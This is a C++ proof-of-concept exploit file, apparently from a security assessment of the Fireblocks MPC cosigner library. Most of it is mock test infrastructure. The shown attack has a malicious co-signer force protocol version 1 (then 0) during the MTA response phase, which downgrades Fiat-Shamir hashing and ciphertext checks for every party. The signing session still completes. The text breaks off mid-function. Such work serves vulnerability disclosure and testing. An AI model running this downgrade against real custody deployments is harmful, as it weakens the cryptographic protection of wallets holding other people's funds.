/*
 * EXTERNAL ATTACKER PROOF OF CONCEPT
 * Fireblocks MPC Library Security Assessment
 *
 * This PoC simulates a MALICIOUS CO-SIGNER participating in the actual MPC
 * protocol through its public API. Each attack demonstrates real-world impact
 * from the perspective of an external attacker who controls one party.
 *
 * Attack surface: All attacks exploit the protocol message exchange API.
 * The attacker does NOT need access to the victim's memory or internal state.
 *
 * Build:
 *   cd build && cmake .. && make -j$(nproc)
 *   cd ..
 *   g++ -g -std=c++17 -I include -I src/common -I test \
 *       -I build/src/common \
 *       -o external_attacker_poc \
 *       external_attacker_poc.cpp \
 *       -L build/src/common -lcosigner \
 *       -lssl -lcrypto -lpthread -ldl -luuid \
 *       -Wl,-rpath,build/src/common
 *
 * Run:
 *   ./external_attacker_poc
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cassert>
#include <chrono>
#include <iostream>
#include <map>
#include <memory>
#include <set>
#include <string>
#include <vector>
#include <shared_mutex>

#include <uuid/uuid.h>
#include <openssl/rand.h>
#include <openssl/bn.h>
#include <openssl/sha.h>

#include "cosigner/cmp_setup_service.h"
#include "cosigner/cmp_ecdsa_online_signing_service.h"
#include "cosigner/cmp_ecdsa_offline_signing_service.h"
#include "cosigner/eddsa_online_signing_service.h"
#include "cosigner/asymmetric_eddsa_cosigner_client.h"
#include "cosigner/asymmetric_eddsa_cosigner_server.h"
#include "cosigner/cmp_offline_refresh_service.h"
#include "cosigner/cosigner_exception.h"
#include "cosigner/cmp_key_persistency.h"
#include "cosigner/mpc_globals.h"
#include "cosigner/types.h"
#include "cosigner/cmp_signature_preprocessed_data.h"
#include "crypto/elliptic_curve_algebra/elliptic_curve256_algebra.h"
#include "crypto/GFp_curve_algebra/GFp_curve_algebra.h"
#include "crypto/ed25519_algebra/ed25519_algebra.h"

#include "cosigner/test_common.h"

#include <stdarg.h>

extern "C" void sgx_log_printf_style(int level, const char* file, const char* function, int line, const char* message, ...)
{
    if (message)
    {
        va_list ap;
        va_start(ap, message);
        vprintf(message, ap);
        va_end(ap);
    }
    putchar('\n');
}

using namespace fireblocks::common::cosigner;
using Clock = std::conditional<std::chrono::high_resolution_clock::is_steady,
    std::chrono::high_resolution_clock, std::chrono::steady_clock>::type;

// ============================================================================
// setup_persistency method implementations (from setup_test.cpp, without Catch2)
// ============================================================================

std::string setup_persistency::dump_key(const std::string& key_id) const
{
    auto it = _keys.find(key_id);
    if (it == _keys.end())
        throw cosigner_exception(cosigner_exception::BAD_KEY);
    return HexStr(it->second.private_key, &it->second.private_key[sizeof(elliptic_curve256_scalar_t)]);
}

bool setup_persistency::key_exist(const std::string& key_id) const
{
    std::shared_lock lock(_mutex);
    return _keys.find(key_id) != _keys.end();
}

void setup_persistency::load_key(const std::string& key_id, cosigner_sign_algorithm& algorithm, elliptic_curve256_scalar_t& private_key) const
{
    std::shared_lock lock(_mutex);
    auto it = _keys.find(key_id);
    if (it == _keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
    memcpy(private_key, it->second.private_key, sizeof(elliptic_curve256_scalar_t));
    algorithm = it->second.algorithm;
}

const std::string setup_persistency::get_tenantid_from_keyid(const std::string& key_id) const { return TENANT_ID; }

void setup_persistency::load_key_metadata(const std::string& key_id, cmp_key_metadata& metadata, bool full_load) const
{
    std::shared_lock lock(_mutex);
    auto it = _keys.find(key_id);
    if (it == _keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
    metadata = it->second.metadata.value();
}

void setup_persistency::load_auxiliary_keys(const std::string& key_id, auxiliary_keys& aux) const
{
    std::shared_lock lock(_mutex);
    auto it = _keys.find(key_id);
    if (it == _keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
    aux = it->second.aux_keys;
}

void setup_persistency::store_key(const std::string& key_id, cosigner_sign_algorithm algorithm, const elliptic_curve256_scalar_t& private_key, uint64_t ttl)
{
    std::unique_lock lock(_mutex);
    auto& info = _keys[key_id];
    memcpy(info.private_key, private_key, sizeof(elliptic_curve256_scalar_t));
    info.algorithm = algorithm;
}

void setup_persistency::store_key_metadata(const std::string& key_id, const cmp_key_metadata& metadata, bool allow_override)
{
    std::unique_lock lock(_mutex);
    auto& info = _keys[key_id];
    if (!allow_override && info.metadata)
        throw cosigner_exception(cosigner_exception::INTERNAL_ERROR);
    info.metadata = metadata;
}

void setup_persistency::store_auxiliary_keys(const std::string& key_id, const auxiliary_keys& aux)
{
    std::unique_lock lock(_mutex);
    _keys[key_id].aux_keys = aux;
}

void setup_persistency::store_keyid_tenant_id(const std::string& key_id, const std::string& tenant_id) {}

void setup_persistency::store_setup_data(const std::string& key_id, const setup_data& metadata, bool override_flag)
{
    std::unique_lock lock(_mutex);
    _setup_data[key_id] = metadata;
}

void setup_persistency::load_setup_data(const std::string& key_id, setup_data& metadata)
{
    std::shared_lock lock(_mutex);
    if (_setup_data.find(key_id) == _setup_data.end())
        throw cosigner_exception(cosigner_exception::INTERNAL_ERROR);
    metadata = _setup_data[key_id];
}

void setup_persistency::store_setup_commitments(const std::string& key_id, const std::map<uint64_t, commitment>& commitments)
{
    std::unique_lock lock(_mutex);
    if (_commitments.find(key_id) != _commitments.end())
        throw cosigner_exception(cosigner_exception::INTERNAL_ERROR);
    _commitments[key_id] = commitments;
}

void setup_persistency::load_setup_commitments(const std::string& key_id, std::map<uint64_t, commitment>& commitments)
{
    std::shared_lock lock(_mutex);
    commitments = _commitments[key_id];
}

void setup_persistency::delete_temporary_key_data(const std::string& key_id, bool delete_key)
{
    std::unique_lock lock(_mutex);
    _setup_data.erase(key_id);
    _commitments.erase(key_id);
    if (delete_key) _keys.erase(key_id);
}

static elliptic_curve256_algebra_ctx_t* create_algebra(cosigner_sign_algorithm type)
{
    switch (type) {
        case ECDSA_SECP256K1: return elliptic_curve256_new_secp256k1_algebra();
        case ECDSA_SECP256R1: return elliptic_curve256_new_secp256r1_algebra();
        case EDDSA_ED25519: return elliptic_curve256_new_ed25519_algebra();
        case ECDSA_STARK: return elliptic_curve256_new_stark_algebra();
    }
    return NULL;
}

class poc_platform : public platform_service
{
public:
    poc_platform(uint64_t id) : _id(id) {}
private:
    void gen_random(size_t len, uint8_t* random_data) const override { RAND_bytes(random_data, len); }
    uint64_t now_msec() const override { return std::chrono::time_point_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now()).time_since_epoch().count(); }
    const std::string get_current_tenantid() const override { return TENANT_ID; }
    uint64_t get_id_from_keyid(const std::string& key_id) const override { return _id; }
    void derive_initial_share(const share_derivation_args& derive_from, cosigner_sign_algorithm algorithm, elliptic_curve256_scalar_t* key) const override { assert(0); }
    byte_vector_t encrypt_for_player(const uint64_t id, const byte_vector_t& data, const std::optional<std::string>& verify_modulus = std::nullopt) const override { return data; }
    byte_vector_t decrypt_message(const byte_vector_t& encrypted_data) const override { return encrypted_data; }
    bool backup_key(const std::string& key_id, cosigner_sign_algorithm algorithm, const elliptic_curve256_scalar_t& private_key, const cmp_key_metadata& metadata, const auxiliary_keys& aux) override { return true; }
    void on_start_signing(const std::string& key_id, const std::string& txid, const signing_data& data, const std::string& metadata_json, const std::set<std::string>& players, const signing_type signature_type) override {}
    void fill_signing_info_from_metadata(const std::string& metadata, std::vector<uint32_t>& flags) const override { assert(0); }
    void fill_eddsa_signing_info_from_metadata(std::vector<eddsa_signature_data>& info, const std::string& metadata) const override { assert(0); }
    void fill_bam_signing_info_from_metadata(std::vector<bam_signing_properties>& info, const std::string& metadata) const override { assert(0); }
    bool is_client_id(uint64_t player_id) const override { return false; }
    void mark_key_setup_in_progress(const std::string& key_id) const override {}
    void clear_key_setup_in_progress(const std::string& key_id) const override {}
    void prepare_for_signing(const std::string& key_id, const std::string tx_id) override {}
    uint64_t _id;
};

struct poc_setup_info
{
    poc_setup_info(uint64_t id, setup_persistency& persistency) : plat(id), setup_service(plat, persistency) {}
    poc_platform plat;
    cmp_setup_service setup_service;
};

void create_secret(players_setup_info& players,
                   cosigner_sign_algorithm type,
                   const std::string& keyid,
                   elliptic_curve256_point_t& pubkey,
                   uint32_t version)
{
    std::unique_ptr<elliptic_curve256_algebra_ctx_t, void(*)(elliptic_curve256_algebra_ctx_t*)> algebra(create_algebra(type), elliptic_curve256_algebra_ctx_free);
    const size_t PUBKEY_SIZE = algebra->point_size(algebra.get());
    memset(pubkey, 0, sizeof(elliptic_curve256_point_t));

    std::vector<uint64_t> players_ids;
    std::map<uint64_t, std::unique_ptr<poc_setup_info>> services;
    for (auto i = players.begin(); i != players.end(); ++i) {
        services.emplace(i->first, std::make_unique<poc_setup_info>(i->first, i->second));
        players_ids.push_back(i->first);
    }

    std::map<uint64_t, commitment> commitments;
    for (auto& [id, svc] : services) {
        commitment& c = commitments[id];
        svc->setup_service.generate_setup_commitments(keyid, TENANT_ID, type, players_ids, players_ids.size(), 0, {}, c);
    }

    std::map<uint64_t, setup_decommitment> decommitments;
    for (auto& [id, svc] : services) {
        setup_decommitment& d = decommitments[id];
        svc->setup_service.store_setup_commitments(keyid, commitments, version, d);
    }
    commitments.clear();

    std::map<uint64_t, setup_zk_proofs> proofs;
    for (auto& [id, svc] : services) {
        setup_zk_proofs& p = proofs[id];
        svc->setup_service.generate_setup_proofs(keyid, decommitments, p);
    }
    decommitments.clear();

    std::map<uint64_t, std::map<uint64_t, byte_vector_t>> paillier_large_factor_proofs;
    for (auto& [id, svc] : services) {
        auto& proof = paillier_large_factor_proofs[id];
        svc->setup_service.verify_setup_proofs(keyid, proofs, proof);
    }
    proofs.clear();

    bool first = true;
    for (auto& [id, svc] : services) {
        std::string public_key;
        cosigner_sign_algorithm algorithm;
        svc->setup_service.create_secret(keyid, paillier_large_factor_proofs, public_key, algorithm);
        assert(algorithm == type);
        assert(public_key.size() == PUBKEY_SIZE);
        if (first) {
            first = false;
            memcpy(pubkey, public_key.data(), PUBKEY_SIZE);
        } else {
            assert(memcmp(pubkey, public_key.data(), PUBKEY_SIZE) == 0);
        }
    }
}

int my_ed25519_verify(const ed25519_algebra_ctx_t* ctx, const uint8_t *message, size_t message_len, const uint8_t signature[64], const uint8_t public_key[32], uint8_t use_keccak)
{
    return ed25519_verify(ctx, message, message_len, signature, public_key, use_keccak);
}

// ============================================================================
// TEST INFRASTRUCTURE (mock platform and persistency classes for attacks)
// ============================================================================

class attack_platform : public platform_service
{
public:
    attack_platform(uint64_t id) : _id(id), _positive_r(false), _use_keccak(false) {}
    void set_positive_r(bool v) { _positive_r = v; }
    void set_use_keccak(bool v) { _use_keccak = v; }
private:
    void gen_random(size_t len, uint8_t* random_data) const override { RAND_bytes(random_data, len); }
    uint64_t now_msec() const override { return std::chrono::time_point_cast<std::chrono::milliseconds>(Clock::now()).time_since_epoch().count(); }
    const std::string get_current_tenantid() const override { return TENANT_ID; }
    uint64_t get_id_from_keyid(const std::string& key_id) const override { return _id; }
    void derive_initial_share(const share_derivation_args&, cosigner_sign_algorithm, elliptic_curve256_scalar_t*) const override { assert(0); }
    byte_vector_t encrypt_for_player(const uint64_t, const byte_vector_t& data, const std::optional<std::string>&) const override { return data; }
    byte_vector_t decrypt_message(const byte_vector_t& data) const override { return data; }
    bool backup_key(const std::string&, cosigner_sign_algorithm, const elliptic_curve256_scalar_t&, const cmp_key_metadata&, const auxiliary_keys&) override { return true; }
    void on_start_signing(const std::string&, const std::string&, const signing_data&, const std::string&, const std::set<std::string>&, const signing_type) override {}
    void fill_signing_info_from_metadata(const std::string&, std::vector<uint32_t>& flags) const override
    {
        for (auto& f : flags) f = _positive_r ? POSITIVE_R : (_use_keccak ? EDDSA_KECCAK : 0);
    }
    void fill_eddsa_signing_info_from_metadata(std::vector<eddsa_signature_data>& info, const std::string&) const override
    {
        for (auto& s : info) s.flags = _use_keccak ? EDDSA_KECCAK : 0;
    }
    void fill_bam_signing_info_from_metadata(std::vector<bam_signing_properties>&, const std::string&) const override {}
    bool is_client_id(uint64_t player_id) const override { return player_id == 12345678; }
    void mark_key_setup_in_progress(const std::string&) const override {}
    void clear_key_setup_in_progress(const std::string&) const override {}
    void prepare_for_signing(const std::string&, const std::string) override {}
    uint64_t _id;
    bool _positive_r;
    bool _use_keccak;
};

class attack_online_persistency : public cmp_ecdsa_online_signing_service::signing_persistency
{
    void store_cmp_signing_data(const std::string& txid, const cmp_signing_metadata& data) override
    {
        std::unique_lock lock(_mutex);
        if (_metadata.find(txid) != _metadata.end())
            throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        _metadata[txid] = data;
    }
    void load_cmp_signing_data(const std::string& txid, cmp_signing_metadata& data) const override
    {
        std::shared_lock lock(_mutex);
        auto it = _metadata.find(txid);
        if (it == _metadata.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        data = it->second;
    }
    void update_cmp_signing_data(const std::string& txid, const cmp_signing_metadata& data) override
    {
        std::unique_lock lock(_mutex);
        auto it = _metadata.find(txid);
        if (it == _metadata.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        it->second = data;
    }
    void delete_temporary_signing_data(const std::string& txid) override
    {
        std::unique_lock lock(_mutex);
        _metadata.erase(txid);
    }
    mutable std::shared_mutex _mutex;
    std::map<std::string, cmp_signing_metadata> _metadata;
};

class attack_eddsa_persistency : public eddsa_online_signing_service::signing_persistency
{
    void store_eddsa_signing_data(const std::string& txid, const std::shared_ptr<eddsa_signing_metadata>& data) override
    {
        std::unique_lock lock(_mutex);
        if (_metadata.find(txid) != _metadata.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        _metadata[txid] = *data;
    }
    std::shared_ptr<eddsa_signing_metadata> load_eddsa_signing_data(const std::string& txid) const override
    {
        std::shared_lock lock(_mutex);
        auto it = _metadata.find(txid);
        if (it == _metadata.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        return std::make_shared<eddsa_signing_metadata>(it->second);
    }
    void update_eddsa_signing_data(const std::string& txid, const std::shared_ptr<eddsa_signing_metadata>& data) override
    {
        std::unique_lock lock(_mutex);
        auto it = _metadata.find(txid);
        if (it == _metadata.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        it->second = *data;
    }
    void store_signing_commitments(const std::string& txid, const std::map<uint64_t, std::vector<commitment>>& commitments) override
    {
        std::unique_lock lock(_mutex);
        _commitments[txid] = commitments;
    }
    void load_signing_commitments(const std::string& txid, std::map<uint64_t, std::vector<commitment>>& commitments) override
    {
        std::shared_lock lock(_mutex);
        auto it = _commitments.find(txid);
        if (it == _commitments.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        commitments = it->second;
    }
    bool delete_eddsa_signing_data(const std::string& txid) override
    {
        std::unique_lock lock(_mutex);
        _metadata.erase(txid);
        _commitments.erase(txid);
        return true;
    }
    mutable std::shared_mutex _mutex;
    std::map<std::string, eddsa_signing_metadata> _metadata;
    std::map<std::string, std::map<uint64_t, std::vector<commitment>>> _commitments;
};

static uint8_t PREPROC_ZERO[sizeof(cmp_signature_preprocessed_data)] = {0};

class attack_preprocessing_persistency : public cmp_ecdsa_offline_signing_service::preprocessing_persistency
{
public:
    void store_preprocessing_metadata(const std::string& request_id, const preprocessing_metadata& data, bool override_val) override
    {
        std::unique_lock lock(_mutex);
        if (!override_val && _metadata.find(request_id) != _metadata.end())
            throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        _metadata[request_id] = data;
    }
    void load_preprocessing_metadata(const std::string& request_id, preprocessing_metadata& data) const override
    {
        std::shared_lock lock(_mutex);
        auto it = _metadata.find(request_id);
        if (it == _metadata.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        data = it->second;
    }
    void store_preprocessing_data(const std::string& request_id, uint64_t index, const ecdsa_preprocessing_data& data) override
    {
        std::unique_lock lock(_mutex);
        _signing_data[request_id][index] = data;
    }
    void load_preprocessing_data(const std::string& request_id, uint64_t index, ecdsa_preprocessing_data& data) const override
    {
        std::shared_lock lock(_mutex);
        auto it = _signing_data.find(request_id);
        if (it == _signing_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        auto idx = it->second.find(index);
        if (idx == it->second.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        data = idx->second;
    }
    void delete_preprocessing_data(const std::string& request_id) override
    {
        std::unique_lock lock(_mutex);
        _metadata.erase(request_id);
        _signing_data.erase(request_id);
    }
    void create_preprocessed_data(const std::string& key_id, uint64_t size) override
    {
        std::unique_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it != _preprocessed_data.end()) {
            if (it->second.size() != size) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        } else
            _preprocessed_data.emplace(key_id, std::vector<cmp_signature_preprocessed_data>(size));
    }
    void store_preprocessed_data(const std::string& key_id, uint64_t index, const cmp_signature_preprocessed_data& data) override
    {
        std::unique_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        if (index >= it->second.size()) throw cosigner_exception(cosigner_exception::INVALID_PRESIGNING_INDEX);
        it->second[index] = data;
    }
    void load_preprocessed_data(const std::string& key_id, uint64_t index, cmp_signature_preprocessed_data& data) override
    {
        std::unique_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        if (index >= it->second.size() || memcmp(it->second[index].k.data, PREPROC_ZERO, sizeof(cmp_signature_preprocessed_data)) == 0)
            throw cosigner_exception(cosigner_exception::INVALID_PRESIGNING_INDEX);
        data = it->second[index];
        memset(it->second[index].k.data, 0, sizeof(cmp_signature_preprocessed_data));
    }
    void delete_preprocessed_data(const std::string& key_id) override
    {
        std::unique_lock lock(_mutex);
        _preprocessed_data.erase(key_id);
    }
    mutable std::shared_mutex _mutex;
    std::map<std::string, preprocessing_metadata> _metadata;
    std::map<std::string, std::map<uint64_t, ecdsa_preprocessing_data>> _signing_data;
    std::map<std::string, std::vector<cmp_signature_preprocessed_data>> _preprocessed_data;
};

class attack_client_persistency : public asymmetric_eddsa_cosigner_client::preprocessing_persistency
{
    void create_preprocessed_data(const std::string& key_id, uint64_t size) override
    {
        std::lock_guard<std::mutex> lock(_mutex);
        if (_preprocessed_data.find(key_id) != _preprocessed_data.end())
            throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        _preprocessed_data.emplace(key_id, std::vector<std::array<uint8_t, sizeof(ed25519_scalar_t)>>(size));
    }
    void store_preprocessed_data(const std::string& key_id, uint64_t index, const ed25519_scalar_t& k) override
    {
        std::lock_guard<std::mutex> lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        if (index >= it->second.size()) throw cosigner_exception(cosigner_exception::INVALID_PRESIGNING_INDEX);
        memcpy(&((it->second[index])[0]), k, sizeof(ed25519_scalar_t));
    }
    void load_preprocessed_data(const std::string& key_id, uint64_t index, ed25519_scalar_t& k) override
    {
        static uint8_t ZERO[sizeof(ed25519_scalar_t)] = {0};
        std::lock_guard<std::mutex> lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        if (index >= it->second.size() || memcmp(&((it->second[index])[0]), ZERO, sizeof(ed25519_scalar_t)) == 0)
            throw cosigner_exception(cosigner_exception::INVALID_PRESIGNING_INDEX);
        memcpy(k, &((it->second[index])[0]), sizeof(ed25519_scalar_t));
        memset(&((it->second[index])[0]), 0, sizeof(ed25519_scalar_t));
    }
    void delete_preprocessed_data(const std::string& key_id) override
    {
        std::lock_guard<std::mutex> lock(_mutex);
        _preprocessed_data.erase(key_id);
    }
    mutable std::mutex _mutex;
    std::map<std::string, std::vector<std::array<uint8_t, sizeof(ed25519_scalar_t)>>> _preprocessed_data;
};

class attack_server_persistency : public asymmetric_eddsa_cosigner_server::signing_persistency
{
    void create_preprocessed_data(const std::string& key_id, uint64_t size) override
    {
        std::unique_lock lock(_mutex);
        if (_preprocessed_data.find(key_id) != _preprocessed_data.end())
            throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        _preprocessed_data.emplace(key_id, std::vector<eddsa_commitment>(size));
    }
    void store_preprocessed_data(const std::string& key_id, uint64_t index, const eddsa_commitment& R_commitment) override
    {
        std::unique_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        if (index >= it->second.size()) throw cosigner_exception(cosigner_exception::INVALID_PRESIGNING_INDEX);
        it->second[index] = R_commitment;
    }
    void load_preprocessed_data(const std::string& key_id, uint64_t index, eddsa_commitment& R_commitment) override
    {
        static uint8_t ZERO[sizeof(ed25519_scalar_t)] = {0};
        std::unique_lock lock(_mutex);
        auto it = _preprocessed_data.find(key_id);
        if (it == _preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        if (index >= it->second.size() || memcmp(it->second[index].data(), ZERO, sizeof(commitments_sha256_t)) == 0)
            throw cosigner_exception(cosigner_exception::INVALID_PRESIGNING_INDEX);
        R_commitment = it->second[index];
        memset(it->second[index].data(), 0, sizeof(commitments_sha256_t));
    }
    void delete_preprocessed_data(const std::string& key_id) override
    {
        std::unique_lock lock(_mutex);
        _preprocessed_data.erase(key_id);
    }
    void store_commitments(const std::string& txid, const std::map<uint64_t, std::vector<eddsa_commitment>>& commitments) override
    {
        std::unique_lock lock(_mutex);
        _commitments[txid] = commitments;
    }
    void load_commitments(const std::string& txid, std::map<uint64_t, std::vector<eddsa_commitment>>& commitments) override
    {
        std::shared_lock lock(_mutex);
        auto it = _commitments.find(txid);
        if (it == _commitments.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        commitments = it->second;
    }
    void delete_commitments(const std::string& txid) override
    {
        std::unique_lock lock(_mutex);
        _commitments.erase(txid);
    }
    void store_signing_data(const std::string& txid, const asymmetric_eddsa_signing_metadata& data, bool update) override
    {
        std::unique_lock lock(_mutex);
        if (!update && _signing_metadata.find(txid) != _signing_metadata.end())
            throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        _signing_metadata[txid] = data;
    }
    void load_signing_data(const std::string& txid, asymmetric_eddsa_signing_metadata& data) override
    {
        std::shared_lock lock(_mutex);
        auto it = _signing_metadata.find(txid);
        if (it == _signing_metadata.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
        data = it->second;
    }
    void delete_signing_data(const std::string& txid) override
    {
        std::unique_lock lock(_mutex);
        _signing_metadata.erase(txid);
    }
    mutable std::shared_mutex _mutex;
    std::map<std::string, std::map<uint64_t, std::vector<eddsa_commitment>>> _commitments;
    std::map<std::string, asymmetric_eddsa_signing_metadata> _signing_metadata;
    std::map<std::string, std::vector<eddsa_commitment>> _preprocessed_data;
};

// ============================================================================
// HELPERS
// ============================================================================

static std::string gen_uuid()
{
    uuid_t uid;
    char buf[37] = {0};
    uuid_generate_random(uid);
    uuid_unparse(uid, buf);
    return std::string(buf);
}

static int test_count = 0;
static int pass_count = 0;
static int fail_count = 0;

#define TEST_START(name) do { \
    test_count++; \
    printf("\n" "========================================\n"); \
    printf("[TEST %d] %s\n", test_count, name); \
    printf("========================================\n"); \
} while(0)

#define TEST_PASS(fmt, ...) do { \
    pass_count++; \
    printf("[PASS] " fmt "\n", ##__VA_ARGS__); \
} while(0)

#define TEST_FAIL(fmt, ...) do { \
    fail_count++; \
    printf("[FAIL] " fmt "\n", ##__VA_ARGS__); \
} while(0)

#define TEST_INFO(fmt, ...) printf("[INFO] " fmt "\n", ##__VA_ARGS__)

// ============================================================================
// ATTACK 1: VERSION DOWNGRADE - Malicious co-signer forces version=1
//
// Threat model: Attacker controls one co-signer in a 2-of-2 CMP ECDSA setup.
// During the MTA response phase, the attacker advertises version=1.
// The protocol negotiates down to version=1 for ALL parties.
//
// Impact: Forces use of truncated Fiat-Shamir hash (Finding F3),
//         disables strict ciphertext length checks,
//         disables extended seed in MTA range proofs.
//
// Real-world: In production, a version negotiation round determines the
// minimum version. A single malicious party sending version=1 forces
// the entire signing session to use v1 cryptography. This is because
// mta_response() at cmp_ecdsa_online_signing_service.cpp:145-157
// accepts ANY version <= MPC_PROTOCOL_VERSION without a minimum floor.
// ============================================================================
void attack_version_downgrade()
{
    TEST_START("CMP ECDSA Version Downgrade Attack (F2+F3)");
    TEST_INFO("Scenario: Malicious co-signer forces protocol version=1");
    TEST_INFO("Expected: Signing succeeds with weak crypto (no min version floor)");

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1]; // Honest party
    players[2]; // Attacker

    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);
    TEST_INFO("Key generation completed at version %d", MPC_PROTOCOL_VERSION);

    // Set up signing services
    attack_platform plat1(1), plat2(2);
    attack_online_persistency sp1, sp2;
    cmp_ecdsa_online_signing_service svc1(plat1, players[1], sp1);
    cmp_ecdsa_online_signing_service svc2(plat2, players[2], sp2);

    std::string txid = gen_uuid();
    byte_vector_t chaincode(32, '\0');
    std::vector<uint32_t> path = {44, 0, 0, 0, 0};

    signing_data data;
    memcpy(data.chaincode, chaincode.data(), sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, '0');
    block.path = path;
    data.blocks.push_back(block);

    std::set<uint64_t> player_ids = {1, 2};
    std::set<std::string> player_strs = {"1", "2"};

    // Round 1: Start signing (both parties)
    std::map<uint64_t, std::vector<cmp_mta_request>> mta_requests;
    svc1.start_signing(keyid, txid, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_requests[1]);
    svc2.start_signing(keyid, txid, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_requests[2]);
    TEST_INFO("Round 1 (start_signing) completed");

    // Round 2: MTA response - ATTACK POINT
    // Honest party uses current version
    // Attacker forces version=1 (below MPC_EXTENDED_MTA=11)
    const uint32_t ATTACKER_VERSION = 1;

    std::map<uint64_t, cmp_mta_responses> mta_responses;
    bool honest_accepted = false;
    bool attacker_accepted = false;

    try {
        svc1.mta_response(txid, mta_requests, ATTACKER_VERSION, mta_responses[1]);
        honest_accepted = true;
    } catch (const cosigner_exception& e) {
        TEST_INFO("Honest party rejected version %d: error %d", ATTACKER_VERSION, e.error_code());
    }

    try {
        svc2.mta_response(txid, mta_requests, ATTACKER_VERSION, mta_responses[2]);
        attacker_accepted = true;
    } catch (const cosigner_exception& e) {
        TEST_INFO("Attacker party rejected version %d: error %d", ATTACKER_VERSION, e.error_code());
    }

    if (honest_accepted && attacker_accepted) {
        TEST_INFO("CRITICAL: Both parties accepted version=%d", ATTACKER_VERSION);
        TEST_INFO("  MPC_MIN_SUPPORTED_PROTOCOL_VERSION=%d exists but is NOT checked",
                  MPC_MIN_SUPPORTED_PROTOCOL_VERSION);
        TEST_INFO("  MPC_EXTENDED_MTA=%d -- version %d is below this threshold",
                  MPC_EXTENDED_MTA, ATTACKER_VERSION);
        TEST_INFO("  Consequences at version=%d:", ATTACKER_VERSION);
        TEST_INFO("    - Truncated Fiat-Shamir hash (50%% of proof.A excluded)");
        TEST_INFO("    - Non-extended seed in MTA range proofs");
        TEST_INFO("    - No strict ciphertext length checks");

        // Continue the protocol to prove it completes successfully
        std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas;
        bool verify_ok = true;
        try {
            auto mta_resp_copy = mta_responses;
            svc1.mta_verify(txid, mta_resp_copy, deltas[1]);
            mta_resp_copy = mta_responses;
            svc2.mta_verify(txid, mta_resp_copy, deltas[2]);
        } catch (const std::exception& e) {
            verify_ok = false;
            TEST_INFO("MTA verify failed: %s", e.what());
        }

        if (verify_ok) {
            std::map<uint64_t, std::vector<elliptic_curve_scalar>> sis;
            svc1.get_si(txid, deltas, sis[1]);
            svc2.get_si(txid, deltas, sis[2]);

            std::vector<recoverable_signature> sigs;
            svc1.get_cmp_signature(txid, sis, sigs);

            // Verify the signature is valid
            std::unique_ptr<elliptic_curve256_algebra_ctx_t, void(*)(elliptic_curve256_algebra_ctx_t*)>
                algebra(elliptic_curve256_new_secp256k1_algebra(), elliptic_curve256_algebra_ctx_free);

            elliptic_curve256_scalar_t msg;
            memcpy(msg, data.blocks[0].data.data(), sizeof(elliptic_curve256_scalar_t));

            PubKey derived_key;
            derive_public_key_generic(algebra.get(), derived_key, pubkey, data.chaincode, path.data(), path.size());

            int sig_valid = GFp_curve_algebra_verify_signature(
                (GFp_curve_algebra_ctx_t*)algebra->ctx, &derived_key, &msg, &sigs[0].r, &sigs[0].s);

            if (sig_valid == ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
                TEST_PASS("Signing COMPLETED with version=1 (weak crypto) -- valid signature produced");
                TEST_INFO("  This proves a malicious co-signer can force weak Fiat-Shamir");
                TEST_INFO("  on ALL parties in the signing session");
            } else {
                TEST_INFO("Signature invalid (verification mismatch at low version)");
            }
        }
    } else {
        TEST_FAIL("Version downgrade was rejected (unexpected)");
    }

    // Also demonstrate that version=0 is accepted
    TEST_INFO("\nTesting extreme downgrade: version=0");
    std::string txid2 = gen_uuid();

    attack_online_persistency sp1b, sp2b;
    cmp_ecdsa_online_signing_service svc1b(plat1, players[1], sp1b);
    cmp_ecdsa_online_signing_service svc2b(plat2, players[2], sp2b);

    std::map<uint64_t, std::vector<cmp_mta_request>> mta_requests2;
    svc1b.start_signing(keyid, txid2, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_requests2[1]);
    svc2b.start_signing(keyid, txid2, ECDSA_SECP256K1, data, "", player_strs, player_ids, mta_requests2[2]);

    try {
